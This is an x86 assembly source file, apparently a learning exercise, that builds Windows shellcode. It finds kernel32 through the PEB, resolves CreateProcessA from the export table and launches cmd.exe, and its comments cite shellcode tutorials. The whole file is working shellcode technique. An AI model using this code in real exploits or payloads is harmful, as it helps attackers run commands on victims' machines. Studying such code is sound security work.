.586
.model flat, stdcall
.stack 4096

includelib libcmt.lib
ExitProcess PROTO, dwExitCode: DWORD
.data
.code
        main PROC c
            ;These are two AWESOME resources for learning all about Windows shellcode
            ;They walk you through basic Windows shellcode and it's up to you to modify it and figure out a use case!
			;
            ;https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html
            ;https://h0mbre.github.io/Babys-First-Shellcode/
            assume fs:nothing
            mov ebp, esp
            sub esp, 20h
            xor esi, esi
            push esi                ;Push CreateProcessA to stack
            pushw 4173h
            push 7365636fh
            push 72506574h
            push 61657243h
            mov [ebp-4], esp        ;var4= "CreateProcessA"

            xor ebx, ebx  
            mov ebx, dword ptr fs:30h; Get pointer to PEB
            mov ebx, [ebx + 0Ch]    ; Get pointer to PEB_LDR_DATA
            mov ebx, [ebx + 14h]    ; Get pointer to first entry in InMemoryOrderModuleList
            mov ebx, [ebx]		    ; Get pointer to second (ntdll.dll) entry in InMemoryOrderModuleList
            mov ebx, [ebx]		    ; Get pointer to third (kernel32.dll) entry in InMemoryOrderModuleList
            mov ebx, [ebx + 10h]    ; Get kernel32.dll base address
            mov [ebp-8], ebx        ; Store at var8
            
            mov eax, [ebx + 3Ch]	; RVA of PE signature
            add eax, ebx       		; Address of PE signature = base address + RVA of PE signature
            mov eax, [eax + 78h]	; RVA of Export Table
            add eax, ebx 			; Address of Export Table
            mov ecx, [eax + 24h]	; RVA of Ordinal Table
            add ecx, ebx 			; Address of Ordinal Table
            mov [ebp-0Ch], ecx 		; var12 = Address of Ordinal Table
            mov edi, [eax + 20h] 	; RVA of Name Pointer Table
            add edi, ebx 			; Address of Name Pointer Table
            mov [ebp-10h], edi 		; var16 = Address of Name Pointer Table
            mov edx, [eax + 1Ch] 	; RVA of Address Table
            add edx, ebx 			; Address of Address Table
            mov [ebp-14h], edx 		; var20 = Address of Address Table
            mov edx, [eax + 14h] 	; Number of exported functions
            xor eax, eax 			; counter = 0

        find_loop:
            mov edi, [ebp-10h] 	    ; edi = var16 = Address of Name Pointer Table
            mov esi, [ebp-4] 	    ; esi = var4 = "CreateProcessA\x00"
            xor ecx, ecx

            cld  			        ; set DF=0 => process strings from left to right
            mov edi, [edi + eax*4]	; Entries in Name Pointer Table are 4 bytes long. Edi = RVA Nth entry = Address of Name Table * 4
            add edi, ebx       	    ; edi = address of string = base address + RVA Nth entry
            add cx, 0Fh 		    ; Length of strings to compare (len('CreateProcessA') = 0xF)
            repe cmpsb          	; Compare the first 14 bytes of strings in esi and edi registers. ZF=1 if equal, ZF=0 if not
            jz found

            inc eax 		        ; counter++
            cmp eax, edx    	    ; check if last function is reached
            jb find_loop 		    ; if not the last -> loop

            add esp, 26h      		
            jmp the_end 		        ; if function is not found, jump to end


        ;The counter (eax) now holds the position of CreateProcessA
        found:
            mov ecx, [ebp-0Ch]	    ; ecx = var12 = Address of Ordinal Table
            mov edx, [ebp-14h]  	; edx = var20 = Address of Address Table

            mov ax, [ecx + eax*2] 	; ax = ordinal number = var12 + (counter * 2)
            mov eax, [edx + eax*4] 	; eax = RVA of function = var20 + (ordinal * 4)
            add eax, ebx 		    ; eax = address of CreateProcessA = kernel32.dll base address + RVA of CreateProcessA

            sub esp, 44h
            mov [ebp-18h], esp      ;&si (startupinfo)
            sub esp, 10h
	        mov [ebp-1Ch], esp      ;&pi (processinfo)
            add esp, 54h

            xor ecx, ecx            ;zero out counter register
            mov cl, 015h            ;counter = 0x15 (0x15 * 0x4 = 0x54)
            xor edi, edi            
            zero_loop:
                push edi            ; place 0x00000000 on stack 0x15 times as a way to 'zero memory' 
                loop zero_loop    
            
            xor edx, edx
            push edx		        ;\0
            ;push 6578652eh         ;exe.
            ;push 636c6163h         ;clac
            push 657865h            ;exe
            push 2e646d63h          ;.dmc
            push 5c32336dh          ;\23m
            push 65747379h          ;etsy
            push 535c7377h          ;S\sw
            push 6f646e69h          ;odni
            push 575c3a43h          ;W\:C
            mov ebx, esp            ;ebx -> "C:\Windows\System32\cmd.exe"

            xor edx, edx
            push [ebp-1Ch]          ;&pi            
            push [ebp-18h]          ;&si
            push edx                ;Null
            push edx                ;Null
            push edx                ;Null
            ;inc edx
            push edx                ;True (works for some reason? False doesn't play nicely)
            ;dec edx
            push edx                ;Null
            push edx                ;Null  
            push edx                ;Null
            push ebx                ;"C:\Windows\System32\cmd.exe"
            call eax                ;CreateProcessA address
            

        the_end:
            add esp, 20h
            add esp, 54h
            push 11111111h
        invoke ExitProcess, eax
     main endp
end
